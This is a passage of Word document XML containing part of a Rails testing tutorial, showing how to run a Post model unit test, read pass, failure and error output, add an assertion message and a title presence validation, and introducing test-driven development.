          <w:tblCellSpacing w:w="0" w:type="dxa"/>
        </w:trPr>
        <w:tc>
          <w:tcPr>
            <w:tcW w:w="0" w:type="auto"/>
            <w:vAlign w:val="center"/>
            <w:hideMark/>
          </w:tcPr>
          <w:p w14:paraId="6F552BDA" w14:textId="77777777" w:rsidR="009A002D" w:rsidRDefault="009A002D" w:rsidP="009A002D">
            <w:r>
              <w:rPr>
                <w:rStyle w:val="HTML0"/>
              </w:rPr>
              <w:t>$ ruby -Itest test/unit/post_test.rb -n test_the_truth</w:t>
            </w:r>
          </w:p>
          <w:p w14:paraId="318046CD" w14:textId="77777777" w:rsidR="009A002D" w:rsidRDefault="009A002D" w:rsidP="009A002D">
            <w:r>
              <w:t> </w:t>
            </w:r>
          </w:p>
          <w:p w14:paraId="21290303" w14:textId="77777777" w:rsidR="009A002D" w:rsidRDefault="009A002D" w:rsidP="009A002D">
            <w:r>
              <w:rPr>
                <w:rStyle w:val="HTML0"/>
              </w:rPr>
              <w:t>Loaded suite unit/post_test</w:t>
            </w:r>
          </w:p>
          <w:p w14:paraId="3D654A14" w14:textId="77777777" w:rsidR="009A002D" w:rsidRDefault="009A002D" w:rsidP="009A002D">
            <w:r>
              <w:rPr>
                <w:rStyle w:val="HTML0"/>
              </w:rPr>
              <w:t>Started</w:t>
            </w:r>
          </w:p>
          <w:p w14:paraId="71D7BFBF" w14:textId="77777777" w:rsidR="009A002D" w:rsidRDefault="009A002D" w:rsidP="009A002D">
            <w:r>
              <w:rPr>
                <w:rStyle w:val="HTML0"/>
              </w:rPr>
              <w:t>.</w:t>
            </w:r>
          </w:p>
          <w:p w14:paraId="7CE40475" w14:textId="77777777" w:rsidR="009A002D" w:rsidRDefault="009A002D" w:rsidP="009A002D">
            <w:r>
              <w:rPr>
                <w:rStyle w:val="HTML0"/>
              </w:rPr>
              <w:t>Finished in 0.023513 seconds.</w:t>
            </w:r>
          </w:p>
          <w:p w14:paraId="528C094B" w14:textId="77777777" w:rsidR="009A002D" w:rsidRDefault="009A002D" w:rsidP="009A002D">
            <w:r>
              <w:t> </w:t>
            </w:r>
          </w:p>
          <w:p w14:paraId="614D67C6" w14:textId="77777777" w:rsidR="009A002D" w:rsidRDefault="009A002D" w:rsidP="009A002D">
            <w:pPr>
              <w:rPr>
                <w:rFonts w:ascii="SimSun" w:eastAsia="SimSun" w:hAnsi="SimSun" w:cs="SimSun"/>
                <w:sz w:val="24"/>
                <w:szCs w:val="24"/>
              </w:rPr>
            </w:pPr>
            <w:r>
              <w:rPr>
                <w:rStyle w:val="HTML0"/>
              </w:rPr>
              <w:t>1 tests, 1 assertions, 0 failures, 0 errors</w:t>
            </w:r>
          </w:p>
        </w:tc>
      </w:tr>
    </w:tbl>
    <w:p w14:paraId="2DE09F18" w14:textId="77777777" w:rsidR="009A002D" w:rsidRDefault="009A002D" w:rsidP="009A002D">
      <w:pPr>
        <w:pStyle w:val="a6"/>
      </w:pPr>
      <w:r>
        <w:t xml:space="preserve">The </w:t>
      </w:r>
      <w:r>
        <w:rPr>
          <w:rStyle w:val="HTML"/>
        </w:rPr>
        <w:t>.</w:t>
      </w:r>
      <w:r>
        <w:t xml:space="preserve"> (dot) above indicates a passing test. When a test fails you see an </w:t>
      </w:r>
      <w:r>
        <w:rPr>
          <w:rStyle w:val="HTML"/>
        </w:rPr>
        <w:t>F</w:t>
      </w:r>
      <w:r>
        <w:t xml:space="preserve">; when a test throws an error you see an </w:t>
      </w:r>
      <w:r>
        <w:rPr>
          <w:rStyle w:val="HTML"/>
        </w:rPr>
        <w:t>E</w:t>
      </w:r>
      <w:r>
        <w:t xml:space="preserve"> in its place. The last line of the output is the summary.</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="1D4417BD" w14:textId="77777777" w:rsidR="009A002D" w:rsidRDefault="009A002D" w:rsidP="009A002D">
      <w:pPr>
        <w:pStyle w:val="a6"/>
      </w:pPr>
      <w:r>
        <w:t xml:space="preserve">To see how a test failure is reported, you can add a failing test to the </w:t>
      </w:r>
      <w:r>
        <w:rPr>
          <w:rStyle w:val="HTML"/>
        </w:rPr>
        <w:t>post_test.rb</w:t>
      </w:r>
      <w:r>
        <w:t xml:space="preserve"> test case.</w:t>
      </w:r>
    </w:p>
    <w:tbl>
      <w:tblPr>
        <w:tblW w:w="0" w:type="auto"/>
        <w:tblCellSpacing w:w="0" w:type="dxa"/>
        <w:tblCellMar>
          <w:left w:w="0" w:type="dxa"/>
          <w:right w:w="0" w:type="dxa"/>
        </w:tblCellMar>
        <w:tblLook w:val="04A0" w:firstRow="1" w:lastRow="0" w:firstColumn="1" w:lastColumn="0" w:noHBand="0" w:noVBand="1"/>
      </w:tblPr>
      <w:tblGrid>
        <w:gridCol w:w="5208"/>
      </w:tblGrid>
      <w:tr w:rsidR="009A002D" w14:paraId="3412495F" w14:textId="77777777" w:rsidTr="009A002D">
        <w:trPr>
          <w:tblCellSpacing w:w="0" w:type="dxa"/>
        </w:trPr>
        <w:tc>
          <w:tcPr>
            <w:tcW w:w="0" w:type="auto"/>
            <w:vAlign w:val="center"/>
            <w:hideMark/>
          </w:tcPr>
          <w:p w14:paraId="584F7417" w14:textId="77777777" w:rsidR="009A002D" w:rsidRDefault="009A002D" w:rsidP="009A002D">
            <w:r>
              <w:rPr>
                <w:rStyle w:val="HTML0"/>
              </w:rPr>
              <w:t>test "should not save post without title"</w:t>
            </w:r>
            <w:r>
              <w:t xml:space="preserve"> </w:t>
            </w:r>
            <w:r>
              <w:rPr>
                <w:rStyle w:val="HTML0"/>
              </w:rPr>
              <w:t>do</w:t>
            </w:r>
          </w:p>
          <w:p w14:paraId="7B258CAA" w14:textId="77777777" w:rsidR="009A002D" w:rsidRDefault="009A002D" w:rsidP="009A002D">
            <w:r>
              <w:rPr>
                <w:rStyle w:val="HTML0"/>
              </w:rPr>
              <w:t>  post = Post.new</w:t>
            </w:r>
          </w:p>
          <w:p w14:paraId="6A924EB1" w14:textId="77777777" w:rsidR="009A002D" w:rsidRDefault="009A002D" w:rsidP="009A002D">
            <w:r>
              <w:rPr>
                <w:rStyle w:val="HTML0"/>
              </w:rPr>
              <w:t>  assert !post.save</w:t>
            </w:r>
          </w:p>
          <w:p w14:paraId="09E1BCBD" w14:textId="77777777" w:rsidR="009A002D" w:rsidRDefault="009A002D" w:rsidP="009A002D">
            <w:pPr>
              <w:rPr>
                <w:rFonts w:ascii="SimSun" w:eastAsia="SimSun" w:hAnsi="SimSun" w:cs="SimSun"/>
                <w:sz w:val="24"/>
                <w:szCs w:val="24"/>
              </w:rPr>
            </w:pPr>
            <w:r>
              <w:rPr>
                <w:rStyle w:val="HTML0"/>
              </w:rPr>
              <w:t>end</w:t>
            </w:r>
          </w:p>
        </w:tc>
      </w:tr>
    </w:tbl>
    <w:p w14:paraId="3C958985" w14:textId="77777777" w:rsidR="009A002D" w:rsidRDefault="009A002D" w:rsidP="009A002D">
      <w:pPr>
        <w:pStyle w:val="a6"/>
      </w:pPr>
      <w:r>
        <w:t>Let us run this newly added test.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0F42F3BD" w14:textId="77777777" w:rsidTr="009A002D">
        <w:trPr>
          <w:tblCellSpacing w:w="0" w:type="dxa"/>
        </w:trPr>
        <w:tc>
          <w:tcPr>
            <w:tcW w:w="0" w:type="auto"/>
            <w:vAlign w:val="center"/>
            <w:hideMark/>
          </w:tcPr>
          <w:p w14:paraId="4FC97C25" w14:textId="77777777" w:rsidR="009A002D" w:rsidRDefault="009A002D" w:rsidP="009A002D">
            <w:r>
              <w:rPr>
                <w:rStyle w:val="HTML0"/>
              </w:rPr>
              <w:t>$ ruby unit/post_test.rb -n test_should_not_save_post_without_title</w:t>
            </w:r>
          </w:p>
          <w:p w14:paraId="7FAC868E" w14:textId="77777777" w:rsidR="009A002D" w:rsidRDefault="009A002D" w:rsidP="009A002D">
            <w:r>
              <w:rPr>
                <w:rStyle w:val="HTML0"/>
              </w:rPr>
              <w:t>Loaded suite -e</w:t>
            </w:r>
          </w:p>
          <w:p w14:paraId="18B3041A" w14:textId="77777777" w:rsidR="009A002D" w:rsidRDefault="009A002D" w:rsidP="009A002D">
            <w:r>
              <w:rPr>
                <w:rStyle w:val="HTML0"/>
              </w:rPr>
              <w:t>Started</w:t>
            </w:r>
          </w:p>
          <w:p w14:paraId="26B11F81" w14:textId="77777777" w:rsidR="009A002D" w:rsidRDefault="009A002D" w:rsidP="009A002D">
            <w:r>
              <w:rPr>
                <w:rStyle w:val="HTML0"/>
              </w:rPr>
              <w:t>F</w:t>
            </w:r>
          </w:p>
          <w:p w14:paraId="74126B55" w14:textId="77777777" w:rsidR="009A002D" w:rsidRDefault="009A002D" w:rsidP="009A002D">
            <w:r>
              <w:rPr>
                <w:rStyle w:val="HTML0"/>
              </w:rPr>
              <w:t>Finished in 0.102072 seconds.</w:t>
            </w:r>
          </w:p>
          <w:p w14:paraId="01AC830F" w14:textId="77777777" w:rsidR="009A002D" w:rsidRDefault="009A002D" w:rsidP="009A002D">
            <w:r>
              <w:t> </w:t>
            </w:r>
          </w:p>
          <w:p w14:paraId="522C8E92" w14:textId="77777777" w:rsidR="009A002D" w:rsidRDefault="009A002D" w:rsidP="009A002D">
            <w:r>
              <w:rPr>
                <w:rStyle w:val="HTML0"/>
              </w:rPr>
              <w:t>  1) Failure:</w:t>
            </w:r>
          </w:p>
          <w:p w14:paraId="126652C2" w14:textId="77777777" w:rsidR="009A002D" w:rsidRDefault="009A002D" w:rsidP="009A002D">
            <w:r>
              <w:rPr>
                <w:rStyle w:val="HTML0"/>
              </w:rPr>
              <w:t>test_should_not_save_post_without_title(PostTest) [/test/unit/post_test.rb:6]:</w:t>
            </w:r>
          </w:p>
          <w:p w14:paraId="7A818D2D" w14:textId="77777777" w:rsidR="009A002D" w:rsidRDefault="009A002D" w:rsidP="009A002D">
            <w:r>
              <w:rPr>
                <w:rStyle w:val="HTML0"/>
              </w:rPr>
              <w:t>&lt;false&gt; is not true.</w:t>
            </w:r>
          </w:p>
          <w:p w14:paraId="5711FA19" w14:textId="77777777" w:rsidR="009A002D" w:rsidRDefault="009A002D" w:rsidP="009A002D">
            <w:r>
              <w:t> </w:t>
            </w:r>
          </w:p>
          <w:p w14:paraId="67B46992" w14:textId="77777777" w:rsidR="009A002D" w:rsidRDefault="009A002D" w:rsidP="009A002D">
            <w:pPr>
              <w:rPr>
                <w:rFonts w:ascii="SimSun" w:eastAsia="SimSun" w:hAnsi="SimSun" w:cs="SimSun"/>
                <w:sz w:val="24"/>
                <w:szCs w:val="24"/>
              </w:rPr>
            </w:pPr>
            <w:r>
              <w:rPr>
                <w:rStyle w:val="HTML0"/>
              </w:rPr>
              <w:t>1 tests, 1 assertions, 1 failures, 0 errors</w:t>
            </w:r>
          </w:p>
        </w:tc>
      </w:tr>
    </w:tbl>
    <w:p w14:paraId="168D4A24" w14:textId="77777777" w:rsidR="009A002D" w:rsidRDefault="009A002D" w:rsidP="009A002D">
      <w:pPr>
        <w:pStyle w:val="a6"/>
      </w:pPr>
      <w:r>
        <w:t xml:space="preserve">In the output, </w:t>
      </w:r>
      <w:r>
        <w:rPr>
          <w:rStyle w:val="HTML"/>
        </w:rPr>
        <w:t>F</w:t>
      </w:r>
      <w:r>
        <w:t xml:space="preserve"> denotes a failure. You can see the corresponding trace shown under </w:t>
      </w:r>
      <w:r>
        <w:rPr>
          <w:rStyle w:val="HTML"/>
        </w:rPr>
        <w:t>1)</w:t>
      </w:r>
      <w:r>
        <w:t xml:space="preserve"> along with the name of the failing test. The next few lines contain the stack trace followed by a message which mentions the actual value and the expected value by the assertion. The default assertion messages provide just enough information to help pinpoint the error. To make the assertion failure message more readable, every assertion provides an optional message parameter, as shown here:</w:t>
      </w:r>
    </w:p>
    <w:tbl>
      <w:tblPr>
        <w:tblW w:w="0" w:type="auto"/>
        <w:tblCellSpacing w:w="0" w:type="dxa"/>
        <w:tblCellMar>
          <w:left w:w="0" w:type="dxa"/>
          <w:right w:w="0" w:type="dxa"/>
        </w:tblCellMar>
        <w:tblLook w:val="04A0" w:firstRow="1" w:lastRow="0" w:firstColumn="1" w:lastColumn="0" w:noHBand="0" w:noVBand="1"/>
      </w:tblPr>
      <w:tblGrid>
        <w:gridCol w:w="6600"/>
      </w:tblGrid>
      <w:tr w:rsidR="009A002D" w14:paraId="03A19E27" w14:textId="77777777" w:rsidTr="009A002D">
        <w:trPr>
          <w:tblCellSpacing w:w="0" w:type="dxa"/>
        </w:trPr>
        <w:tc>
          <w:tcPr>
            <w:tcW w:w="0" w:type="auto"/>
            <w:vAlign w:val="center"/>
            <w:hideMark/>
          </w:tcPr>
          <w:p w14:paraId="45620E8F" w14:textId="77777777" w:rsidR="009A002D" w:rsidRDefault="009A002D" w:rsidP="009A002D">
            <w:r>
              <w:rPr>
                <w:rStyle w:val="HTML0"/>
              </w:rPr>
              <w:t>test "should not save post without title"</w:t>
            </w:r>
            <w:r>
              <w:t xml:space="preserve"> </w:t>
            </w:r>
            <w:r>
              <w:rPr>
                <w:rStyle w:val="HTML0"/>
              </w:rPr>
              <w:t>do</w:t>
            </w:r>
          </w:p>
          <w:p w14:paraId="5DD568BA" w14:textId="77777777" w:rsidR="009A002D" w:rsidRDefault="009A002D" w:rsidP="009A002D">
            <w:r>
              <w:rPr>
                <w:rStyle w:val="HTML0"/>
              </w:rPr>
              <w:t>  post = Post.new</w:t>
            </w:r>
          </w:p>
          <w:p w14:paraId="5F1F8D2C" w14:textId="77777777" w:rsidR="009A002D" w:rsidRDefault="009A002D" w:rsidP="009A002D">
            <w:r>
              <w:rPr>
                <w:rStyle w:val="HTML0"/>
              </w:rPr>
              <w:t>  assert !post.save, "Saved the post without a title"</w:t>
            </w:r>
          </w:p>
          <w:p w14:paraId="5877B683" w14:textId="77777777" w:rsidR="009A002D" w:rsidRDefault="009A002D" w:rsidP="009A002D">
            <w:pPr>
              <w:rPr>
                <w:rFonts w:ascii="SimSun" w:eastAsia="SimSun" w:hAnsi="SimSun" w:cs="SimSun"/>
                <w:sz w:val="24"/>
                <w:szCs w:val="24"/>
              </w:rPr>
            </w:pPr>
            <w:r>
              <w:rPr>
                <w:rStyle w:val="HTML0"/>
              </w:rPr>
              <w:t>end</w:t>
            </w:r>
          </w:p>
        </w:tc>
      </w:tr>
    </w:tbl>
    <w:p w14:paraId="6A3CFA7C" w14:textId="77777777" w:rsidR="009A002D" w:rsidRDefault="009A002D" w:rsidP="009A002D">
      <w:pPr>
        <w:pStyle w:val="a6"/>
      </w:pPr>
      <w:r>
        <w:t>Running this test shows the friendlier assertion message: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B85ADCA" w14:textId="77777777" w:rsidTr="009A002D">
        <w:trPr>
          <w:tblCellSpacing w:w="0" w:type="dxa"/>
        </w:trPr>
        <w:tc>
          <w:tcPr>
            <w:tcW w:w="0" w:type="auto"/>
            <w:vAlign w:val="center"/>
            <w:hideMark/>
          </w:tcPr>
          <w:p w14:paraId="4062495A" w14:textId="77777777" w:rsidR="009A002D" w:rsidRDefault="009A002D" w:rsidP="009A002D">
            <w:r>
              <w:rPr>
                <w:rStyle w:val="HTML0"/>
              </w:rPr>
              <w:t>1) Failure:</w:t>
            </w:r>
          </w:p>
          <w:p w14:paraId="15A4E787" w14:textId="77777777" w:rsidR="009A002D" w:rsidRDefault="009A002D" w:rsidP="009A002D">
            <w:r>
              <w:rPr>
                <w:rStyle w:val="HTML0"/>
              </w:rPr>
              <w:t>test_should_not_save_post_without_title(PostTest) [/test/unit/post_test.rb:6]:</w:t>
            </w:r>
          </w:p>
          <w:p w14:paraId="7252D3BF" w14:textId="77777777" w:rsidR="009A002D" w:rsidRDefault="009A002D" w:rsidP="009A002D">
            <w:r>
              <w:rPr>
                <w:rStyle w:val="HTML0"/>
              </w:rPr>
              <w:t>Saved the post without a title.</w:t>
            </w:r>
          </w:p>
          <w:p w14:paraId="6E923EF2" w14:textId="77777777" w:rsidR="009A002D" w:rsidRDefault="009A002D" w:rsidP="009A002D">
            <w:pPr>
              <w:rPr>
                <w:rFonts w:ascii="SimSun" w:eastAsia="SimSun" w:hAnsi="SimSun" w:cs="SimSun"/>
                <w:sz w:val="24"/>
                <w:szCs w:val="24"/>
              </w:rPr>
            </w:pPr>
            <w:r>
              <w:rPr>
                <w:rStyle w:val="HTML0"/>
              </w:rPr>
              <w:t>&lt;false&gt; is not true.</w:t>
            </w:r>
          </w:p>
        </w:tc>
      </w:tr>
    </w:tbl>
    <w:p w14:paraId="52692388" w14:textId="77777777" w:rsidR="009A002D" w:rsidRDefault="009A002D" w:rsidP="009A002D">
      <w:pPr>
        <w:pStyle w:val="a6"/>
      </w:pPr>
      <w:r>
        <w:t xml:space="preserve">Now to get this test to pass we can add a model level validation for the </w:t>
      </w:r>
      <w:r>
        <w:rPr>
          <w:rStyle w:val="a7"/>
        </w:rPr>
        <w:t>title</w:t>
      </w:r>
      <w:r>
        <w:t xml:space="preserve"> field.</w:t>
      </w:r>
    </w:p>
    <w:tbl>
      <w:tblPr>
        <w:tblW w:w="0" w:type="auto"/>
        <w:tblCellSpacing w:w="0" w:type="dxa"/>
        <w:tblCellMar>
          <w:left w:w="0" w:type="dxa"/>
          <w:right w:w="0" w:type="dxa"/>
        </w:tblCellMar>
        <w:tblLook w:val="04A0" w:firstRow="1" w:lastRow="0" w:firstColumn="1" w:lastColumn="0" w:noHBand="0" w:noVBand="1"/>
      </w:tblPr>
      <w:tblGrid>
        <w:gridCol w:w="4608"/>
      </w:tblGrid>
      <w:tr w:rsidR="009A002D" w14:paraId="19F877B8" w14:textId="77777777" w:rsidTr="009A002D">
        <w:trPr>
          <w:tblCellSpacing w:w="0" w:type="dxa"/>
        </w:trPr>
        <w:tc>
          <w:tcPr>
            <w:tcW w:w="0" w:type="auto"/>
            <w:vAlign w:val="center"/>
            <w:hideMark/>
          </w:tcPr>
          <w:p w14:paraId="2684E9B5" w14:textId="77777777" w:rsidR="009A002D" w:rsidRDefault="009A002D" w:rsidP="009A002D">
            <w:r>
              <w:rPr>
                <w:rStyle w:val="HTML0"/>
              </w:rPr>
              <w:t>class</w:t>
            </w:r>
            <w:r>
              <w:t xml:space="preserve"> </w:t>
            </w:r>
            <w:r>
              <w:rPr>
                <w:rStyle w:val="HTML0"/>
              </w:rPr>
              <w:t>Post &lt; ActiveRecord::Base</w:t>
            </w:r>
          </w:p>
          <w:p w14:paraId="54067B4D" w14:textId="77777777" w:rsidR="009A002D" w:rsidRDefault="009A002D" w:rsidP="009A002D">
            <w:r>
              <w:rPr>
                <w:rStyle w:val="HTML0"/>
              </w:rPr>
              <w:t>  validates :title, :presence</w:t>
            </w:r>
            <w:r>
              <w:t xml:space="preserve"> </w:t>
            </w:r>
            <w:r>
              <w:rPr>
                <w:rStyle w:val="HTML0"/>
              </w:rPr>
              <w:t>=&gt; true</w:t>
            </w:r>
          </w:p>
          <w:p w14:paraId="17B51BCE" w14:textId="77777777" w:rsidR="009A002D" w:rsidRDefault="009A002D" w:rsidP="009A002D">
            <w:pPr>
              <w:rPr>
                <w:rFonts w:ascii="SimSun" w:eastAsia="SimSun" w:hAnsi="SimSun" w:cs="SimSun"/>
                <w:sz w:val="24"/>
                <w:szCs w:val="24"/>
              </w:rPr>
            </w:pPr>
            <w:r>
              <w:rPr>
                <w:rStyle w:val="HTML0"/>
              </w:rPr>
              <w:t>end</w:t>
            </w:r>
          </w:p>
        </w:tc>
      </w:tr>
    </w:tbl>
    <w:p w14:paraId="6C158510" w14:textId="77777777" w:rsidR="009A002D" w:rsidRDefault="009A002D" w:rsidP="009A002D">
      <w:pPr>
        <w:pStyle w:val="a6"/>
      </w:pPr>
      <w:r>
        <w:t>Now the test should pass. Let us verify by running the test again:</w:t>
      </w:r>
    </w:p>
    <w:tbl>
      <w:tblPr>
        <w:tblW w:w="0" w:type="auto"/>
        <w:tblCellSpacing w:w="0" w:type="dxa"/>
        <w:tblCellMar>
          <w:left w:w="0" w:type="dxa"/>
          <w:right w:w="0" w:type="dxa"/>
        </w:tblCellMar>
        <w:tblLook w:val="04A0" w:firstRow="1" w:lastRow="0" w:firstColumn="1" w:lastColumn="0" w:noHBand="0" w:noVBand="1"/>
      </w:tblPr>
      <w:tblGrid>
        <w:gridCol w:w="8040"/>
      </w:tblGrid>
      <w:tr w:rsidR="009A002D" w14:paraId="32552AE3" w14:textId="77777777" w:rsidTr="009A002D">
        <w:trPr>
          <w:tblCellSpacing w:w="0" w:type="dxa"/>
        </w:trPr>
        <w:tc>
          <w:tcPr>
            <w:tcW w:w="0" w:type="auto"/>
            <w:vAlign w:val="center"/>
            <w:hideMark/>
          </w:tcPr>
          <w:p w14:paraId="109EB1FF" w14:textId="77777777" w:rsidR="009A002D" w:rsidRDefault="009A002D" w:rsidP="009A002D">
            <w:r>
              <w:rPr>
                <w:rStyle w:val="HTML0"/>
              </w:rPr>
              <w:t>$ ruby unit/post_test.rb -n test_should_not_save_post_without_title</w:t>
            </w:r>
          </w:p>
          <w:p w14:paraId="331F4ECA" w14:textId="77777777" w:rsidR="009A002D" w:rsidRDefault="009A002D" w:rsidP="009A002D">
            <w:r>
              <w:rPr>
                <w:rStyle w:val="HTML0"/>
              </w:rPr>
              <w:t>Loaded suite unit/post_test</w:t>
            </w:r>
          </w:p>
          <w:p w14:paraId="531E7C57" w14:textId="77777777" w:rsidR="009A002D" w:rsidRDefault="009A002D" w:rsidP="009A002D">
            <w:r>
              <w:rPr>
                <w:rStyle w:val="HTML0"/>
              </w:rPr>
              <w:t>Started</w:t>
            </w:r>
          </w:p>
          <w:p w14:paraId="5394F118" w14:textId="77777777" w:rsidR="009A002D" w:rsidRDefault="009A002D" w:rsidP="009A002D">
            <w:r>
              <w:rPr>
                <w:rStyle w:val="HTML0"/>
              </w:rPr>
              <w:t>.</w:t>
            </w:r>
          </w:p>
          <w:p w14:paraId="13F1F73E" w14:textId="77777777" w:rsidR="009A002D" w:rsidRDefault="009A002D" w:rsidP="009A002D">
            <w:r>
              <w:rPr>
                <w:rStyle w:val="HTML0"/>
              </w:rPr>
              <w:t>Finished in 0.193608 seconds.</w:t>
            </w:r>
          </w:p>
          <w:p w14:paraId="44A6D0FA" w14:textId="77777777" w:rsidR="009A002D" w:rsidRDefault="009A002D" w:rsidP="009A002D">
            <w:r>
              <w:t> </w:t>
            </w:r>
          </w:p>
          <w:p w14:paraId="4EABDD49" w14:textId="77777777" w:rsidR="009A002D" w:rsidRDefault="009A002D" w:rsidP="009A002D">
            <w:pPr>
              <w:rPr>
                <w:rFonts w:ascii="SimSun" w:eastAsia="SimSun" w:hAnsi="SimSun" w:cs="SimSun"/>
                <w:sz w:val="24"/>
                <w:szCs w:val="24"/>
              </w:rPr>
            </w:pPr>
            <w:r>
              <w:rPr>
                <w:rStyle w:val="HTML0"/>
              </w:rPr>
              <w:t>1 tests, 1 assertions, 0 failures, 0 errors</w:t>
            </w:r>
          </w:p>
        </w:tc>
      </w:tr>
    </w:tbl>
    <w:p w14:paraId="085B197D" w14:textId="77777777" w:rsidR="009A002D" w:rsidRDefault="009A002D" w:rsidP="009A002D">
      <w:pPr>
        <w:pStyle w:val="a6"/>
      </w:pPr>
      <w:r>
        <w:t xml:space="preserve">Now, if you noticed, we first wrote a test which fails for a desired functionality, then we wrote some code which adds the functionality and finally we ensured that our test passes. This approach to software development is referred to as </w:t>
      </w:r>
      <w:r>
        <w:rPr>
          <w:rStyle w:val="a7"/>
        </w:rPr>
        <w:t>Test-Driven Development</w:t>
      </w:r>
      <w:r>
        <w:t xml:space="preserve"> (</w:t>
      </w:r>
      <w:r>
        <w:rPr>
          <w:rStyle w:val="caps"/>
        </w:rPr>
        <w:t>TDD</w:t>
      </w:r>
      <w:r>
        <w:t>).</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="29ED8DC7" w14:textId="77777777" w:rsidR="009A002D" w:rsidRDefault="009A002D" w:rsidP="009A002D">
      <w:pPr>
        <w:pStyle w:val="a6"/>
      </w:pPr>
      <w:r>
        <w:t xml:space="preserve">Many Rails developers practice </w:t>
      </w:r>
      <w:r>
        <w:rPr>
          <w:rStyle w:val="a7"/>
        </w:rPr>
        <w:t>Test-Driven Development</w:t>
      </w:r>
      <w:r>
        <w:t xml:space="preserve"> (</w:t>
      </w:r>
      <w:r>
        <w:rPr>
          <w:rStyle w:val="caps"/>
        </w:rPr>
        <w:t>TDD</w:t>
      </w:r>
      <w:r>
        <w:t xml:space="preserve">). This is an excellent way to build up a test suite that exercises every part of your application. </w:t>
      </w:r>
      <w:r>
        <w:rPr>
          <w:rStyle w:val="caps"/>
        </w:rPr>
        <w:t>TDD</w:t>
      </w:r>
      <w:r>
        <w:t xml:space="preserve"> is beyond the scope of this guide, but one place to start is with </w:t>
      </w:r>
      <w:hyperlink r:id="rId644" w:history="1">
        <w:r>
          <w:rPr>
            <w:rStyle w:val="a3"/>
          </w:rPr>
          <w:t xml:space="preserve">15 </w:t>
        </w:r>
        <w:r>
          <w:rPr>
            <w:rStyle w:val="caps"/>
            <w:color w:val="0000FF"/>
            <w:u w:val="single"/>
          </w:rPr>
          <w:t>TDD</w:t>
        </w:r>
        <w:r>
          <w:rPr>
            <w:rStyle w:val="a3"/>
          </w:rPr>
          <w:t xml:space="preserve"> steps to create a Rails application</w:t>
        </w:r>
      </w:hyperlink>
      <w:r>
        <w:t>.</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="1964DC11" w14:textId="77777777" w:rsidR="009A002D" w:rsidRDefault="009A002D" w:rsidP="009A002D">
      <w:pPr>
        <w:pStyle w:val="a6"/>
      </w:pPr>
      <w:r>
        <w:t>To see how an error gets reported, here’s a test containing an error:</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6B435E1" w14:textId="77777777" w:rsidTr="009A002D">
        <w:trPr>
          <w:tblCellSpacing w:w="0" w:type="dxa"/>
        </w:trPr>
        <w:tc>
          <w:tcPr>
            <w:tcW w:w="0" w:type="auto"/>
            <w:vAlign w:val="center"/>
            <w:hideMark/>
          </w:tcPr>
          <w:p w14:paraId="4D5B4AAC" w14:textId="77777777" w:rsidR="009A002D" w:rsidRDefault="009A002D" w:rsidP="009A002D">
            <w:r>
              <w:rPr>
                <w:rStyle w:val="HTML0"/>
              </w:rPr>
              <w:t>test "should report error"</w:t>
            </w:r>
            <w:r>
              <w:t xml:space="preserve"> </w:t>
            </w:r>
            <w:r>
              <w:rPr>
                <w:rStyle w:val="HTML0"/>
              </w:rPr>
              <w:t>do</w:t>
            </w:r>
          </w:p>
          <w:p w14:paraId="424C81CD" w14:textId="77777777" w:rsidR="009A002D" w:rsidRDefault="009A002D" w:rsidP="009A002D">
            <w:r>
              <w:rPr>
                <w:rStyle w:val="HTML0"/>
              </w:rPr>
              <w:t>  # some_undefined_variable is not defined elsewhere in the test case</w:t>
            </w:r>
          </w:p>
          <w:p w14:paraId="0C1C5CBC" w14:textId="77777777" w:rsidR="009A002D" w:rsidRDefault="009A002D" w:rsidP="009A002D">
            <w:r>
              <w:rPr>
                <w:rStyle w:val="HTML0"/>
              </w:rPr>
              <w:t>  some_undefined_variable</w:t>
            </w:r>
          </w:p>
          <w:p w14:paraId="371E41CF" w14:textId="77777777" w:rsidR="009A002D" w:rsidRDefault="009A002D" w:rsidP="009A002D">
            <w:r>
              <w:rPr>
                <w:rStyle w:val="HTML0"/>
              </w:rPr>
              <w:t>  assert true</w:t>
            </w:r>
          </w:p>
          <w:p w14:paraId="1ECF6DCE" w14:textId="77777777" w:rsidR="009A002D" w:rsidRDefault="009A002D" w:rsidP="009A002D">
            <w:pPr>
              <w:rPr>
                <w:rFonts w:ascii="SimSun" w:eastAsia="SimSun" w:hAnsi="SimSun" w:cs="SimSun"/>
                <w:sz w:val="24"/>
                <w:szCs w:val="24"/>
              </w:rPr>
            </w:pPr>
            <w:r>
              <w:rPr>
                <w:rStyle w:val="HTML0"/>
              </w:rPr>
              <w:t>end</w:t>
            </w:r>
          </w:p>
        </w:tc>
      </w:tr>
    </w:tbl>
    <w:p w14:paraId="1A83BB81" w14:textId="77777777" w:rsidR="009A002D" w:rsidRDefault="009A002D" w:rsidP="009A002D">
      <w:pPr>
        <w:pStyle w:val="a6"/>
      </w:pPr>
      <w:r>
        <w:t>Now you can see even more output in the console from running the tests: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9838FEF" w14:textId="77777777" w:rsidTr="009A002D">
        <w:trPr>
          <w:tblCellSpacing w:w="0" w:type="dxa"/>
        </w:trPr>
        <w:tc>
          <w:tcPr>
            <w:tcW w:w="0" w:type="auto"/>
            <w:vAlign w:val="center"/>
            <w:hideMark/>
          </w:tcPr>
          <w:p w14:paraId="4ABCF145" w14:textId="77777777" w:rsidR="009A002D" w:rsidRDefault="009A002D" w:rsidP="009A002D">
            <w:r>
              <w:rPr>
                <w:rStyle w:val="HTML0"/>
              </w:rPr>
              <w:t>$ ruby unit/post_test.rb -n test_should_report_error</w:t>
            </w:r>
          </w:p>
          <w:p w14:paraId="4D80C0C1" w14:textId="77777777" w:rsidR="009A002D" w:rsidRDefault="009A002D" w:rsidP="009A002D">
            <w:r>
              <w:rPr>
                <w:rStyle w:val="HTML0"/>
              </w:rPr>
              <w:t>Loaded suite -e</w:t>
            </w:r>
          </w:p>
          <w:p w14:paraId="5F6F7A0A" w14:textId="77777777" w:rsidR="009A002D" w:rsidRDefault="009A002D" w:rsidP="009A002D">
            <w:r>
              <w:rPr>
                <w:rStyle w:val="HTML0"/>
              </w:rPr>
              <w:t>Started</w:t>
            </w:r>
          </w:p>
          <w:p w14:paraId="52A9A7E0" w14:textId="77777777" w:rsidR="009A002D" w:rsidRDefault="009A002D" w:rsidP="009A002D">
            <w:r>
              <w:rPr>
                <w:rStyle w:val="HTML0"/>
              </w:rPr>
              <w:t>E</w:t>
            </w:r>
          </w:p>
